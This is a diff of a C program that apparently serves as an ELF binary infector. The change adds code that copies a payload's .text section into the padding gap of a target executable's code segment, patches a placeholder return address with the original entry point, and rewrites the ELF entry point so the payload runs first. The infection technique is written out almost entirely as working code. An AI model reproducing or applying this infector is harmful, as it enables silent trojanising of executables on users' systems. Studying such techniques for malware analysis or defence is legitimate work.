@@ -6,53 +6,100 @@
 #include "logger.h"
 #include "elf.h"
 
+#define RET_PATTERN 0x1111111111111111
+
 int main(int argc, char *argv[])
 {
-    void *target_data;
-    char *target_path;
-    int target_fd;
-    int target_fsize;
+    int ret;
+    int target_fd, payload_fd;
+    int target_fsize, payload_fsize;
+    char *target_path, *payload_path;
+    void *target_data, *payload_data;
 
-    Elf64_Ehdr* elf_hdr;
-    Elf64_Addr elf_ep;
-    Elf64_Phdr *elf_text;
+    Elf64_Ehdr* target_hdr;
+    Elf64_Addr target_ep, target_base;
+    Elf64_Phdr *target_text_seg;
+    Elf64_Shdr *payload_text_sec;
 
-    int gap_offset;
-    int gap_len;
+    int gap_offset, gap_len;
 
-    if (argc != 2) {
-        fprintf(stderr, "usage: %s target\n", argv[0]);
-        return 1;
+    /* check args */
+    if (argc != 3) {
+        log_errf("usage: %s target payload\n", argv[0]);
+        exit(1);
     }
 
     /* parse args */
     target_path = argv[1];
+    payload_path = argv[2];
 
-    /* open file */
+    /* open files */
+    /* TODO: check that elf is of type EXEC */
     target_fd = open(target_path, O_APPEND | O_RDWR, 0);
     if (target_fd < 0) {
         log_perr("open");
         exit(1);
     }
+    payload_fd = open(payload_path, O_APPEND | O_RDWR, 0);
+    if (payload_fd < 0) {
+        log_perr("open");
+        exit(1);
+    }
 
+    /* map file to memory */
     target_fd  = elfi_map(target_fd, &target_data, &target_fsize);
+    payload_fd = elfi_map(payload_fd, &payload_data, &payload_fsize);
 
-    /* get binary entry point */
-    elf_hdr = (Elf64_Ehdr *) target_data;
-    elf_ep = elf_hdr->e_entry;
+    /* get target binary entry point */
+    target_hdr = (Elf64_Ehdr *) target_data;
+    target_ep = target_hdr->e_entry;
 
-    log_infof("target entry point: %p", (void *) elf_ep);
+    log_infof("target entry point: %p", (void *) target_ep);
 
-    elfi_dump_segments(elf_hdr);
+    /* TODO: debug */
+    /* elfi_dump_segments(target_hdr); */
 
-    /* Find executable segment and obtain offset and gap size */
-    elf_text = elfi_find_gap(target_data, target_fsize, &gap_offset, &gap_len);
-    /* base = t_text_seg->p_vaddr; */
+    /* find executable segment and obtain offset and gap size */
+    target_text_seg = elfi_find_gap(target_data, target_fsize, &gap_offset, &gap_len);
+    target_base = target_text_seg->p_vaddr;
 
-    log_infof("target .text seg: %p", (void *) elf_text);
+    log_infof("target base address: %p", (void *) target_base);
+
+    payload_text_sec = elfi_find_section(payload_data, ".text");
+
+    /* NOTE: Looks like we do not really have to patch the segment sizes */
+    target_text_seg->p_filesz += payload_text_sec->sh_size;
+    target_text_seg->p_memsz += payload_text_sec->sh_size;
+
+    log_infof("payload .text section found at %lx (%lx bytes)",
+              payload_text_sec->sh_offset, payload_text_sec->sh_size);
+
+    if (payload_text_sec->sh_size > gap_len) {
+        log_errf("payload to big, cannot infect file");
+        exit(1);
+    }
+
+    /* copy payload in the segment padding area */
+    memmove(target_data + gap_offset,
+            payload_data + payload_text_sec->sh_offset,
+            payload_text_sec->sh_size);
+
+    /* patch return address */
+    ret = elfi_mem_subst(target_data + gap_offset,
+                         payload_text_sec->sh_size,
+                         RET_PATTERN, (long) target_ep);
+    if (ret) {
+        log_err("failed to patch return address");
+    }
+
+    /* patch entry point */
+    target_hdr->e_entry = (Elf64_Addr) (target_base + gap_offset);
+
+    log_infof("new target entry: %p", (void *) target_hdr->e_entry);
 
     /* clean up */
     close(target_fd);
+    close(payload_fd);
 
     return 0;
 }
